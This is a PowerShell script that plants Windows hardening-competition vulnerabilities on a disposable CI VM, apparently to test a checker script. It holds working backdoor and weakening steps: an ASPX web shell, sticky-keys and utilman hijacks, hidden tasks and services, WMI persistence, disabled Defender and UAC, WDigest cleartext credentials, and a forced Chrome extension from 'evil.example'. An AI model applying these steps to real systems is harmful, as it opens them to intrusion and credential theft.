# Plants CyberPatriot-style vulnerabilities on a throwaway GitHub Actions Windows VM.
# Every plant is recorded in out\planted.json so verify.ps1 only checks what really got planted.
$ErrorActionPreference = 'Stop'
$planted = [ordered]@{}
function Plant([string]$name, [scriptblock]$sb) {
    try { & $sb; $planted[$name] = $true; Write-Host "[planted] $name" -ForegroundColor Green }
    catch { $planted[$name] = $false; Write-Host "[FAILED ] $name : $($_.Exception.Message)" -ForegroundColor Yellow }
}
function SetReg([string]$path, [string]$name, $value, [string]$type = 'DWord') {
    if (-not (Test-Path -LiteralPath $path)) { New-Item -Path $path -Force | Out-Null }
    New-ItemProperty -LiteralPath $path -Name $name -Value $value -PropertyType $type -Force | Out-Null
}
New-Item -ItemType Directory -Force -Path out, ([Environment]::GetFolderPath('Desktop')) | Out-Null
$sys32 = "$env:windir\System32"

# ---------- SAFETY FIRST: this VM can be reached from the internet. Block every inbound port a plant opens.
Plant 'safety-block-inbound' {
    New-NetFirewallRule -DisplayName 'CI safety: block inbound test ports' -Direction Inbound -Action Block -Protocol TCP -LocalPort 21,139,445,3389,4444,5985 -Profile Any | Out-Null
    Disable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
}
$activeIsDomain = @(Get-NetConnectionProfile | Where-Object { $_.NetworkCategory -eq 'DomainAuthenticated' }).Count -gt 0

# ---------- users
$pw = ConvertTo-SecureString 'Plant!Passw0rd#2026' -AsPlainText -Force
Plant 'user-hacker-admin'   { New-LocalUser -Name hacker -Password $pw | Out-Null; Add-LocalGroupMember -SID 'S-1-5-32-544' -Member hacker }
Plant 'user-svc$-hidden'    { New-LocalUser -Name 'svc$' -Password $pw -Description 'hidden' | Out-Null }
Plant 'user-akim-admin'     { New-LocalUser -Name akim -Password $pw | Out-Null; Add-LocalGroupMember -SID 'S-1-5-32-545' -Member akim; Add-LocalGroupMember -SID 'S-1-5-32-544' -Member akim }
Plant 'user-mlee-notadmin'  { New-LocalUser -Name mlee -Password $pw | Out-Null; Add-LocalGroupMember -SID 'S-1-5-32-545' -Member mlee }
Plant 'user-carol-disabled' { New-LocalUser -Name carol -Password $pw -Disabled | Out-Null; Add-LocalGroupMember -SID 'S-1-5-32-545' -Member carol }
Plant 'user-lookalike'      { New-LocalUser -Name 'mr.stevenson' -Password $pw -FullName 'Mr. Stevenson' | Out-Null }   # README lists stanley.stevenson
Plant 'user-magistrate'     { New-LocalUser -Name magistrate -Password $pw -PasswordNeverExpires | Out-Null }   # a scoring engine's account (Mushroom Kingdom)
Plant 'guest-enabled'       { Get-LocalUser | Where-Object { $_.SID.Value -like '*-501' } | Enable-LocalUser }

# ---------- account policy + user rights (secedit)
Plant 'weak-policy' {
    $hackerSid = (Get-LocalUser hacker).SID.Value
    $inf = @"
[Unicode]
Unicode=yes
[Version]
signature="`$CHICAGO`$"
Revision=1
[System Access]
MinimumPasswordAge = 0
MinimumPasswordLength = 0
PasswordComplexity = 0
PasswordHistorySize = 0
LockoutBadCount = 3
ResetLockoutCount = 30
LockoutDuration = 30
ClearTextPassword = 1
[Privilege Rights]
SeTcbPrivilege = *$hackerSid
SeDebugPrivilege = *S-1-5-32-544,*S-1-1-0
"@
    $inf | Set-Content -Path "$env:TEMP\plant.inf" -Encoding Unicode
    secedit /configure /db "$env:TEMP\plant.sdb" /cfg "$env:TEMP\plant.inf" /areas SECURITYPOLICY USER_RIGHTS /quiet | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "secedit exit $LASTEXITCODE" }
}
Plant 'audit-cleared' { auditpol /clear /y | Out-Null; if ($LASTEXITCODE -ne 0) { throw "auditpol exit $LASTEXITCODE" } }

# ---------- registry: security options and friends
Plant 'reg-lsa'      { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'RestrictAnonymous' 0; SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'LmCompatibilityLevel' 2 }
Plant 'reg-uac'      { SetReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'EnableLUA' 0; SetReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'DisableCAD' 1 }
Plant 'reg-wdigest'  { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' 'UseLogonCredential' 1 }
Plant 'reg-aie'      { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' 'AlwaysInstallElevated' 1 }
Plant 'au-disabled'  { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' 'NoAutoUpdate' 1 }
Plant 'defender-policy-off' { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' 'DisableAntiSpyware' 1 }
Plant 'defender-exclusion'  { Add-MpPreference -ExclusionPath 'C:\Users\Public' }
Plant 'chrome-policy' {
    SetReg 'HKLM:\SOFTWARE\Policies\Google\Chrome' 'SafeBrowsingProtectionLevel' 0
    SetReg 'HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist' '1' 'abcdefghijklmnopabcdefghijklmnop;https://evil.example/update.xml' 'String'
}
Plant 'mrxsmb20-disabled'   { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\mrxsmb20' 'Start' 4 }
Plant 'workstation-disabled' { Set-Service LanmanWorkstation -StartupType Disabled }
Plant 'fw-domain-off' {
    if ($activeIsDomain) { throw 'Domain profile is the active one; not turning it off on an internet-facing VM' }
    Set-NetFirewallProfile -Profile Domain -Enabled False
    SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile' 'EnableFirewall' 0
}
Plant 'telnet-client' { if ((Get-WindowsOptionalFeature -Online -FeatureName TelnetClient).State -ne 'Enabled') { throw 'TelnetClient not enabled' } }

# ---------- persistence / malware
Plant 'ifeo-utilman' { SetReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' 'Debugger' "$sys32\cmd.exe" 'String' }
Plant 'sethc-replaced' {
    takeown /f "$sys32\sethc.exe" | Out-Null
    icacls "$sys32\sethc.exe" /grant '*S-1-5-32-544:F' | Out-Null
    Copy-Item "$sys32\cmd.exe" "$sys32\sethc.exe" -Force
    if ((Get-FileHash "$sys32\sethc.exe").Hash -ne (Get-FileHash "$sys32\cmd.exe").Hash) { throw 'copy did not stick' }
}
Plant 'winlogon-shell' { SetReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Shell' 'explorer.exe, C:\Users\Public\up.exe' 'String' }
Plant 'lsa-notification' {
    $k = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
    $cur = @((Get-ItemProperty -LiteralPath $k).'Notification Packages')
    SetReg $k 'Notification Packages' ([string[]]($cur + 'evilpw')) 'MultiString'
}
Plant 'run-key' { SetReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'Updater' 'C:\Users\Public\up.exe' 'String' }
Plant 'task-updater' {
    Register-ScheduledTask -TaskName 'Updater' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -c "Write-Output planted"') -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) | Out-Null
}
Plant 'task-hidden' {
    Register-ScheduledTask -TaskName 'GhostTask' -Action (New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo ghost') -Trigger (New-ScheduledTaskTrigger -Daily -At 4am) | Out-Null
    # Removing the SD value hides the task (Tarrask). TaskCache belongs to SYSTEM, so do it from a SYSTEM task.
    $act = New-ScheduledTaskAction -Execute 'reg.exe' -Argument 'delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\GhostTask" /v SD /f'
    Register-ScheduledTask -TaskName 'CIHideIt' -Action $act -User 'SYSTEM' -RunLevel Highest | Out-Null
    Start-ScheduledTask -TaskName 'CIHideIt'; Start-Sleep -Seconds 6
    Unregister-ScheduledTask -TaskName 'CIHideIt' -Confirm:$false
    $sd = (Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\GhostTask').GetValue('SD', $null)
    if ($sd) { throw 'SD value still present' }
}
Plant 'wmi-persistence' {
    $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = 'EvilFilter'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }
    $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = 'EvilConsumer'; CommandLineTemplate = 'cmd.exe /c echo wmi > C:\Windows\Temp\wmi.txt' }
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
}
Plant 'portproxy' { netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.6.6.6 | Out-Null; if ($LASTEXITCODE -ne 0) { throw "netsh exit $LASTEXITCODE" } }
Plant 'hosts-entry' { Add-Content -Path "$sys32\drivers\etc\hosts" -Value "`r`n10.6.6.6 windowsupdate.microsoft.com" }
Plant 'share-everyone' { New-Item -ItemType Directory -Force C:\Data | Out-Null; New-SmbShare -Name Data -Path C:\Data -FullAccess Everyone | Out-Null }
Plant 'svc-backdoor'  { sc.exe create backdoor binPath= "$sys32\cmd.exe /c echo backdoor" start= demand | Out-Null; if ($LASTEXITCODE -ne 0) { throw "sc exit $LASTEXITCODE" } }
Plant 'svc-unquoted' {
    New-Item -ItemType Directory -Force 'C:\Program Files\Cool Service' | Out-Null
    Copy-Item "$sys32\whoami.exe" 'C:\Program Files\Cool Service\svc.exe' -Force
    sc.exe create coolsvc binPath= 'C:\Program Files\Cool Service\svc.exe -run' start= demand | Out-Null; if ($LASTEXITCODE -ne 0) { throw "sc exit $LASTEXITCODE" }
}
Plant 'svc-hidden' {
    sc.exe create evilsvc binPath= 'C:\ProgramData\x.exe' start= demand | Out-Null
    sc.exe sdset evilsvc 'D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)' | Out-Null
    if (Get-Service evilsvc -ErrorAction SilentlyContinue) { throw 'service still visible to Get-Service' }
}
Plant 'svc-locked' {
    sc.exe create lockedsvc binPath= "$sys32\whoami.exe" start= demand | Out-Null
    sc.exe sdset lockedsvc 'D:(D;;WPDTSD;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)' | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "sc exit $LASTEXITCODE" }
}
Plant 'driver-folder-exe' { Copy-Item "$sys32\whoami.exe" "$sys32\drivers\dwm.exe" -Force }
Plant 'tool-nc'  { Copy-Item "$sys32\whoami.exe" 'C:\Users\Public\nc.exe' -Force }
Plant 'media-mp3' { New-Item -ItemType Directory -Force 'C:\Users\Public\Music' | Out-Null; Set-Content 'C:\Users\Public\Music\song.mp3' 'not really audio' }
Plant 'ads' {
    New-Item -ItemType Directory -Force 'C:\Users\Public\Documents' | Out-Null
    Set-Content 'C:\Users\Public\Documents\notes.txt' 'hello'
    Set-Content -Path 'C:\Users\Public\Documents\notes.txt' -Stream 'hidden' -Value 'password: hunter2'
}
Plant 'live-shell' { Start-Process cmd.exe -ArgumentList '/c ping -n 1200 127.0.0.1 > nul' -WindowStyle Hidden }

# ---------- added after the code review
Plant 'autologon' {
    $w = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
    SetReg $w 'AutoAdminLogon' '1' 'String'; SetReg $w 'DefaultUserName' 'mlee' 'String'; SetReg $w 'DefaultPassword' 'Plain!Text1' 'String'
}
Plant 'winrm-basic' {
    SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service' 'AllowBasic' 1
    SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service' 'AllowUnencryptedTraffic' 1
}
Plant 'share-users-change' { New-Item -ItemType Directory -Force C:\Data2 | Out-Null; New-SmbShare -Name Data2 -Path C:\Data2 -ChangeAccess 'BUILTIN\Users' | Out-Null }
Plant 'rdp-nla-policy-off' { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' 'UserAuthentication' 0 }
Plant 'asr-one-disabled' {
    $have = @((Get-MpPreference).AttackSurfaceReductionRules_Ids) | Where-Object { $_ }
    if ($have.Count -gt 0) { throw "image already has $($have.Count) ASR rule(s); the single-rule case cannot be tested" }
    Add-MpPreference -AttackSurfaceReductionRules_Ids '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2' -AttackSurfaceReductionRules_Actions Disabled
}
Plant 'exclusion-whole-drive' { Add-MpPreference -ExclusionPath 'C:\' }
Plant 'root-file' { Set-Content 'C:\passwords.txt' 'admin:Summer2024!' }
# ---------- found by running the PPTH practice image
Plant 'task-ms-powershell' {
    $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -File C:\Users\Public\reset.ps1'
    $t = New-ScheduledTaskTrigger -Once -At ([datetime]'2099-01-01')
    Register-ScheduledTask -TaskPath '\Microsoft\Windows\Maintenance\' -TaskName 'SysCheck' -Action $a -Trigger $t -ErrorAction Stop | Out-Null
    Disable-ScheduledTask -TaskPath '\Microsoft\Windows\Maintenance\' -TaskName 'SysCheck' | Out-Null
}
Plant 'task-shutdown' {
    # Never allowed to run: disabled and dated 2099 (Among the Reindeer's \Oxygen task ran shutdown.exe /s /t 1600).
    $a = New-ScheduledTaskAction -Execute 'shutdown.exe' -Argument '/s /t 1600'
    $t = New-ScheduledTaskTrigger -Once -At ([datetime]'2099-01-01')
    Register-ScheduledTask -TaskName 'Oxygen' -Action $a -Trigger $t -ErrorAction Stop | Out-Null
    Disable-ScheduledTask -TaskName 'Oxygen' | Out-Null
}
Plant 'task-wininit' {
    # Never allowed to run: disabled and dated 2099 (running wininit.exe as a task blue-screens the PC).
    $a = New-ScheduledTaskAction -Execute 'wininit.exe'
    $t = New-ScheduledTaskTrigger -Once -At ([datetime]'2099-01-01')
    Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskUserUA' -Action $a -Trigger $t -ErrorAction Stop | Out-Null
    Disable-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskUserUA' | Out-Null
}
Plant 'mpssvc-depends-sense' {
    # Beyond Journey's End: the firewall made to depend on a service that never starts. Registry only, so the running
    # firewall keeps running (the service control manager reads dependencies at boot).
    $k = 'HKLM:\SYSTEM\CurrentControlSet\Services\MpsSvc'
    $cur = @((Get-Item $k).GetValue('DependOnService'))
    Set-ItemProperty -LiteralPath $k -Name DependOnService -Value ([string[]]($cur + 'Sense')) -Type MultiString -ErrorAction Stop
}
Plant 'fw-public-allow' { Set-NetFirewallProfile -Profile Public -DefaultInboundAction Allow -ErrorAction Stop }
Plant 'hidden-anydesk' {
    $f = Join-Path ([Environment]::GetFolderPath('Desktop')) 'AnyDesk.exe'
    Copy-Item "$env:windir\System32\PING.EXE" $f -Force
    (Get-Item $f -Force).Attributes = 'Hidden'
}

# ---------- a fake scoring engine (aeacus-style) must be reported as "leave it alone", never [!]
Plant 'engine-aeacus' {
    New-Item -ItemType Directory -Force 'C:\aeacus' | Out-Null
    Copy-Item "$env:windir\System32\PING.EXE" 'C:\aeacus\phocus.exe' -Force
    sc.exe create CSSClient binPath= 'C:\aeacus\phocus.exe' start= demand | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "sc create exit $LASTEXITCODE" }
}
Plant 'engine-magistrate' {
    New-Item -ItemType Directory -Force 'C:\Scoring\Magistrate' | Out-Null
    Copy-Item "$env:windir\System32\PING.EXE" 'C:\Scoring\Magistrate\Magistrate.Windows.exe' -Force
    sc.exe create magistrate binPath= 'C:\Scoring\Magistrate\Magistrate.Windows.exe' start= demand | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "sc create exit $LASTEXITCODE" }
}
# ---------- found on Mushroom Kingdom (Magistrate image guide)
Plant 'svc-psexec-style' {
    Set-Content -LiteralPath "$env:windir\qWeRtYuI.exe" -Value 'MZ' -Encoding Ascii   # unsigned placeholder, like Impacket's random .exe
    sc.exe create ffUx binPath= "$env:windir\qWeRtYuI.exe" start= demand | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "sc create exit $LASTEXITCODE" }
}
# ---------- found on the Troy Windows 10 Mock answer key
Plant 'svc-swapped' {
    New-Item -ItemType Directory -Force 'C:\Windows\Globalization\Sorting' | Out-Null
    Set-Content 'C:\Windows\Globalization\Sorting\Medic Service.exe' 'not a real exe'
    sc.exe create fakemedic binPath= '"C:\Windows\Globalization\Sorting\Medic Service.exe"' start= demand | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "sc create exit $LASTEXITCODE" }
    SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\fakemedic\Parameters' 'ServiceDll' '%SystemRoot%\System32\WaaSMedicSvc.dll' 'ExpandString'
}
Plant 'cpl-evil' { SetReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls' 'evil' 'C:\Users\Public\evil.cpl' 'String' }
Plant 'ps1-doubleclick-run' { Set-ItemProperty -LiteralPath 'Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell' -Name '(default)' -Value '0' -ErrorAction Stop }
Plant 'sehop-off' { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel' 'DisableExceptionChainValidation' 1 }
Plant 'smb-autodisconnect' { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'autodisconnect' 120 }
Plant 'null-session-fallback' { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' 'allownullsessionfallback' 1 }
Plant 'boot-testsigning' { bcdedit /set '{current}' testsigning on | Out-Null; if ($LASTEXITCODE -ne 0) { throw "bcdedit exit $LASTEXITCODE (Secure Boot?)" } }
# ---------- found on the PPTH practice image answer key
Plant 'defender-ignore-severe' {
    SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Threats' 'Threats_ThreatSeverityDefaultAction' 1
    SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction' '5' '6' 'String'
    Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction Stop
}
Plant 'defender-script-scan-policy' { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' 'DisableScriptScanning' 1 }
Plant 'driver-mimidrv' {
    Set-Content 'C:\Users\Public\mimidrv.sys' 'not a real driver'
    sc.exe create mimidrv type= kernel start= demand binPath= 'C:\Users\Public\mimidrv.sys' | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "sc create exit $LASTEXITCODE" }
}
Plant 'rdp-on' { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' 'fDenyTSConnections' 0 }
# ---------- planted security options (values Windows keeps secure by default) and broken tools
Plant 'defender-exclude-ext'  { Add-MpPreference -ExclusionExtension 'exe' -ErrorAction Stop }
Plant 'mpssvc-account'      { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\MpsSvc' 'ObjectName' 'LocalSystem' 'String' }   # King Arthur's Castle; applies only after a reboot
Plant 'forceguest'            { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'ForceGuest' 1 }
Plant 'safedll-off'           { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' 'SafeDllSearchMode' 0 }
Plant 'pointandprint-nowarn'  { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' 'NoWarningNoElevationOnInstall' 1 }
Plant 'null-session-share'    { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'NullSessionShares' ([string[]]@('Public')) 'MultiString' }
Plant 'insecure-guest-smb'    { SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' 'AllowInsecureGuestAuth' 1 }
Plant 'installer-usercontrol' { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' 'EnableUserControl' 1 }
Plant 'llmnr-on-policy'       { SetReg 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' 'EnableMulticast' 1 }
Plant 'broken-taskmgr'        { SetReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'DisableTaskMgr' 1 }
Plant 'broken-disallowrun'    {
    SetReg 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' 'DisallowRun' 1
    SetReg 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun' '1' 'regedit.exe' 'String'
}
Plant 'path-hijack' {
    # Registry only: running processes (and the CI runner) keep their own environment.
    $ek = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment'
    $raw = (Get-Item -LiteralPath $ek).GetValue('Path', '', 'DoNotExpandEnvironmentNames')
    New-Item -ItemType Directory -Force -Path 'C:\Users\Public\bin' | Out-Null
    Set-ItemProperty -LiteralPath $ek -Name Path -Value ('C:\Users\Public\bin;' + $raw) -Type ExpandString
}
Plant 'firefox-autoconfig' {
    $ff = 'C:\Program Files\Mozilla Firefox'
    if (-not (Test-Path "$ff\firefox.exe")) { throw 'Firefox not installed on this runner' }
    New-Item -ItemType Directory -Force "$ff\defaults\pref" | Out-Null
    Set-Content "$ff\defaults\pref\autoconfig.js" "pref(`"general.config.filename`", `"mozilla.cfg`");`npref(`"general.config.obscure_value`", 0);"
    Set-Content "$ff\mozilla.cfg" "// first line is skipped`nlockPref(`"browser.safebrowsing.malware.enabled`", false);"
}

# ---------- IIS + FTP
Plant 'iis-weak' {
    Import-Module WebAdministration
    $s = 'IIS:\Sites\Default Web Site'
    Set-WebConfigurationProperty -Filter /system.webServer/directoryBrowse -Name enabled -Value $true -PSPath $s
    Set-WebConfigurationProperty -Filter /system.webServer/httpErrors -Name errorMode -Value 'Detailed' -PSPath $s
    Set-ItemProperty $s -Name logFile.enabled -Value $false
    Set-ItemProperty 'IIS:\AppPools\DefaultAppPool' -Name processModel.identityType -Value LocalSystem
    Set-Content 'C:\inetpub\wwwroot\phpinfo.php' '<?php phpinfo(); ?>'
    Set-Content 'C:\inetpub\wwwroot\shell.aspx' '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", Request["c"]); %>'
}
Plant 'ftp-anonymous' {
    Import-Module WebAdministration
    New-Item -ItemType Directory -Force 'C:\inetpub\ftproot' | Out-Null
    New-WebFtpSite -Name 'CI FTP' -Port 21 -PhysicalPath 'C:\inetpub\ftproot' -Force | Out-Null
    Set-ItemProperty 'IIS:\Sites\CI FTP' -Name ftpServer.security.authentication.anonymousAuthentication.enabled -Value $true
}

# ---------- DNS
Plant 'dns-weak' {
    Add-DnsServerPrimaryZone -Name 'cp.test' -ZoneFile 'cp.test.dns' -DynamicUpdate NonsecureAndSecure
    Set-DnsServerPrimaryZone -Name 'cp.test' -SecureSecondaries TransferAnyServer
    Set-DnsServerCache -PollutionProtection $false
}
# Registry only: the running DNS service is not restarted, so it never tries to load this (missing) DLL.
Plant 'dns-plugin-dll' { if (-not (Get-Service DNS -ErrorAction SilentlyContinue)) { throw 'no DNS service' }; SetReg 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters' 'ServerLevelPluginDll' 'C:\Windows\System32\mkxproxyloader.dll' 'String' }

$planted | ConvertTo-Json | Set-Content out\planted.json
$ok = @($planted.Values | Where-Object { $_ }).Count
Write-Host "`nPlanted $ok of $($planted.Count)" -ForegroundColor Cyan
